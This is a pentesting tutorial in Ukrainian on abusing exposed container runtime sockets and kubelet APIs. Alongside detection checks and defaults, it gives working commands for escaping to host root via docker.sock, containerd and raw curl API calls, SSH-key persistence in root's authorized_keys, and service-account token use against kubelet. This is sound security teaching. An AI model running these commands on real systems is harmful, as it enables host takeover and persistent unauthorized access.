# Відкритість Runtime API та демона

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Багато реальних компрометацій контейнерів узагалі не починаються з виходу з namespace. Вони починаються з доступу до площини керування runtime. Якщо workload може взаємодіяти з `dockerd`, `containerd`, CRI-O, Podman або kubelet через змонтований Unix-сокет чи відкритий TCP-слухач, зловмисник може надіслати запит на створення нового контейнера з ширшими привілеями, змонтувати файлову систему хоста, приєднатися до namespace хоста або отримати конфіденційну інформацію про вузол. У таких випадках справжньою межею безпеки є Runtime API, а його компрометація фактично майже рівнозначна компрометації хоста.

Саме тому відкритість сокета runtime слід документувати окремо від захисту ядра. Контейнер зі звичайними обмеженнями seccomp, capabilities і MAC усе одно може бути за один виклик API від компрометації хоста, якщо всередині нього змонтовано `/var/run/docker.sock` або `/run/containerd/containerd.sock`. Ізоляція поточного контейнера на рівні ядра може працювати саме так, як задумано, тоді як площина керування runtime залишається повністю відкритою.

## Моделі доступу до демона

Docker Engine традиційно надає доступ до свого привілейованого API через локальний Unix-сокет `unix:///var/run/docker.sock`. Історично він також був доступний віддалено через TCP-слухачі, наприклад `tcp://0.0.0.0:2375`, або через захищений TLS-слухач на порту `2376`. Відкриття демона для віддаленого доступу без надійного TLS і автентифікації клієнтів фактично перетворює Docker API на віддалений інтерфейс root.

containerd, CRI-O, Podman і kubelet відкривають подібні поверхні з високим рівнем впливу. Назви й робочі процеси відрізняються, але логіка залишається незмінною. Якщо інтерфейс дає змогу викликачеві створювати workloads, монтувати шляхи хоста, отримувати облікові дані або змінювати запущені контейнери, це привілейований канал керування, до якого слід відповідно ставитися.

Вебінтерфейс керування контейнерами може відкрити ту саму межу без надання локальному обліковому запису прямого доступу до сокета. Наприклад, у [Portainer issue #493](https://github.com/portainer/portainer/issues/493) описано скидання пароля адміністратора без автентифікації в застарілій збірці 1.11.1. Розглядайте доступний локально інтерфейс лише як підказку для перевірки: підтвердьте встановлену збірку та поведінку автентифікації, фактичний контроль адміністратора й те, чи може керована ним кінцева точка створювати контейнери зі змонтованим для запису каталогом хоста. [У документації Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) зазначено, що для керування через сокет потрібен доступ до Docker-сокета; rootless або обмежена кінцева точка зменшує вплив на хост. Не робіть висновків про вразливість автентифікації чи доступ до root на хості лише на основі назви процесу, порту або рядка версії.

Поширені локальні шляхи, які варто перевірити:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Старіші або спеціалізованіші стеки також можуть відкривати такі кінцеві точки, як `dockershim.sock`, `frakti.sock` або `rktlet.sock`. У сучасних середовищах вони трапляються рідше, але якщо ви їх виявили, ставтеся до них із такою самою обережністю, адже це поверхні керування runtime, а не звичайні сокети застосунків.

## Безпечний віддалений доступ

Якщо демон потрібно відкрити за межами локального сокета, з’єднання слід захистити за допомогою TLS, бажано з взаємною автентифікацією, щоб демон перевіряв клієнта, а клієнт — демон. Звичка відкривати Docker daemon через незахищений HTTP заради зручності — одна з найнебезпечніших помилок в адмініструванні контейнерів, оскільки поверхня API дає змогу безпосередньо створювати привілейовані контейнери.

Історично конфігурація Docker виглядала так:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

На хостах на базі systemd обмін даними з daemon також може використовувати `fd://`, тобто процес успадковує попередньо відкритий socket від systemd, замість того щоб самостійно прив’язувати його. Важливий не точний синтаксис, а наслідки для безпеки. Щойно daemon починає слухати не лише на локальному socket із суворими дозволами, захист транспортного рівня та автентифікація клієнтів стають обов’язковими, а не просто додатковим посиленням захисту.

## Зловживання

Якщо socket runtime присутній, з’ясуйте, який саме, чи є сумісний клієнт і чи можливий доступ через raw HTTP або gRPC:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Ці команди корисні, оскільки дають змогу відрізнити недоступний шлях, змонтований, але недоступний сокет і активний привілейований API. Якщо клієнт працює, наступне питання — чи може API запустити новий контейнер зі змонтованим каталогом хоста або спільним простором імен хоста.

### Коли клієнт не встановлено

Відсутність `docker`, `podman` чи іншого зручного CLI не означає, що сокет безпечний. Docker Engine спілкується через HTTP у своєму Unix-сокеті, а Podman надає через `podman system service` і Docker-сумісний API, і власний API Libpod. Це означає, що мінімального середовища, де є лише `curl`, може бути достатньо для керування демоном:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Для виконання PHP-коду з обмеженням `open_basedir` [підключення через Unix-сокети залишаються окремим шляхом](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir), якщо процес PHP має дозвіл ОС на підключення.

Це важливо під час post-exploitation, оскільки захисники іноді видаляють звичні клієнтські бінарні файли, але залишають змонтованим сокет керування. На хостах Podman пам’ятайте, що шлях із високими привілеями залежить від того, чи розгортання rootful, чи rootless: `unix:///run/podman/podman.sock` для rootful-екземплярів служби та `unix://$XDG_RUNTIME_DIR/podman/podman.sock` для rootless.

### Повний приклад: від Docker Socket до root на хості

Якщо доступний `docker.sock`, класичний escape — запустити новий контейнер, змонтувати в ньому кореневу файлову систему хоста, а потім виконати `chroot` до неї:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Це забезпечує безпосереднє виконання команд на хості з привілеями root через Docker daemon. Наслідки не обмежуються читанням файлів. Опинившись у новому контейнері, зловмисник може змінювати файли хоста, викрадати облікові дані, закріпитися в системі або запускати додаткові привілейовані робочі навантаження.

### Повний приклад: від Docker Socket до просторів імен хоста

Якщо зловмисник надає перевагу входженню в простори імен замість доступу лише до файлової системи:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Цей шлях досягає host, змушуючи runtime створити новий контейнер із явним доступом до namespace host, а не використовуючи вразливість поточного контейнера.

### Патерн persistence через Docker Socket

Керування runtime також можна використовувати для persistence, а не лише для запуску одноразової shell-сесії. Загальна схема полягає у створенні допоміжного контейнера з монтуванням host, записі матеріалів авторизованого доступу або startup hook у змонтовану файлову систему host, а потім перевірці, чи використовує їх host.

Приклад:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Та сама ідея може бути застосована до systemd units, фрагментів cron, файлів запуску програм або SSH-ключів — залежно від того, що оператор хоче довести. Важливо, що постійна зміна вноситься через повноваження runtime daemon щодо файлової системи хоста, а не завдяки додатковим привілеям в оригінальному контейнері.

### Raw Docker API Helper Pivot

Коли Docker CLI відсутній, той самий сценарій із допоміжним контейнером і монтуванням хоста можна виконати через HTTP поверх Unix socket. Загальна послідовність така: перевірити API, створити допоміжний контейнер із host bind mount, запустити його, створити exec instance і запустити цей exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Фінальний запит `/exec/<id>/start` залежить від повернутого exec ID, але суть безпеки не залежить від точного налаштування JSON: прямого доступу до API rootful Docker daemon достатньо, щоб запросити привілейованіше допоміжне навантаження.

### Повний приклад: сокет containerd

Змонтований сокет `containerd` зазвичай не менш небезпечний:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Якщо доступний клієнт, більш схожий на Docker, `nerdctl` може бути зручнішим за `ctr`, оскільки він підтримує звичні прапорці, як-от `--privileged`, `--pid=host` і `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Впливом знову є компрометація хоста. Навіть якщо специфічні для Docker інструменти відсутні, інший runtime API усе ще може надавати такі самі адміністративні повноваження. На вузлах Kubernetes для розвідки та взаємодії з контейнерами може бути достатньо й `crictl`, оскільки він напряму взаємодіє з кінцевою точкою CRI.

### Сокет BuildKit

`buildkitd` легко не помітити, адже його часто вважають «лише бекендом для збирання», але демон усе одно є привілейованою площиною керування. Доступна кінцева точка `buildkitd.sock` може дозволити зловмиснику виконувати довільні кроки збирання, перевіряти можливості worker, використовувати локальні контексти зі зламаного середовища та запитувати небезпечні entitlements, як-от `network.host` або `security.insecure`, якщо демон налаштований на їх дозвіл.

Корисні перші дії:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Якщо daemon приймає запити на збирання, перевірте, чи доступні небезпечні entitlements:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Точний вплив залежить від конфігурації daemon, але rootful BuildKit service з permissive entitlements — це не нешкідлива зручність для розробників. Вважайте його ще однією важливою адміністративною поверхнею, особливо на CI runners і спільних build nodes.

### Kubelet API через TCP

Kubelet — це не container runtime, але він усе ще є частиною площини керування вузлом і часто входить до обговорення тієї самої межі довіри. Якщо з робочого навантаження доступний захищений порт kubelet `10250` або розкрито облікові дані вузла, kubeconfigs чи права на проксі, зловмисник може перелічити Pods, отримати журнали або виконувати команди в контейнерах на вузлі, навіть не звертаючись до шляху admission API Kubernetes.

Почніть із простого виявлення:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Якщо шлях через kubelet або проксі API-сервера авторизує `exec`, клієнт із підтримкою WebSocket може використати це для виконання коду в інших контейнерах на вузлі. Саме тому дозвіл лише `get` для `nodes/proxy` небезпечніший, ніж здається: запит усе ще може досягти кінцевих точок kubelet, які виконують команди, а такі прямі взаємодії з kubelet не відображаються у звичайних журналах аудиту Kubernetes.<sup>[[2]](#references)</sup>

## Перевірки

Мета цих перевірок — з’ясувати, чи може контейнер досягти будь-якої площини керування, яка мала залишатися за межами межі довіри.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Що тут цікаво:

- Змонтований runtime socket зазвичай є прямим адміністративним інструментом, а не просто джерелом розкриття інформації.
- TCP listener на `2375` без TLS слід вважати умовою для віддаленої компрометації.
- Змінні середовища, як-от `DOCKER_HOST`, часто свідчать, що workload навмисно налаштовано для взаємодії з host runtime.

## Типові налаштування runtime

| Runtime / платформа | Типовий стан | Типова поведінка | Поширені способи послаблення захисту вручну |
| --- | --- | --- | --- |
| Docker Engine | За замовчуванням локальний Unix socket | `dockerd` прослуховує локальний socket, а daemon зазвичай працює з root-привілеями | монтування `/var/run/docker.sock`, відкриття `tcp://...:2375`, слабкий або відсутній TLS на `2376` |
| Podman | За замовчуванням CLI без daemon | Для звичайного локального використання не потрібен постійно запущений privileged daemon; API sockets усе ще можуть бути відкриті, якщо ввімкнено `podman system service` | відкриття `podman.sock`, запуск service із широким доступом, використання rootful API |
| containerd | Локальний privileged socket | Адміністративний API доступний через локальний socket і зазвичай використовується інструментами вищого рівня | монтування `containerd.sock`, широкий доступ через `ctr` або `nerdctl`, відкриття privileged namespaces |
| CRI-O | Локальний privileged socket | CRI endpoint призначений для довірених компонентів, локальних для вузла | монтування `crio.sock`, відкриття CRI endpoint для недовірених workloads |
| Kubernetes kubelet | Локальний для вузла API керування | Kubelet не повинен бути широко доступним із Pods; залежно від authn/authz доступ може розкривати стан pod, credentials і функції виконання | монтування kubelet sockets або certs, слабка автентифікація kubelet, host networking і доступний kubelet endpoint |



## References

- [1] [Експлуатація containerd socket, частина 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Ризики обходу Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
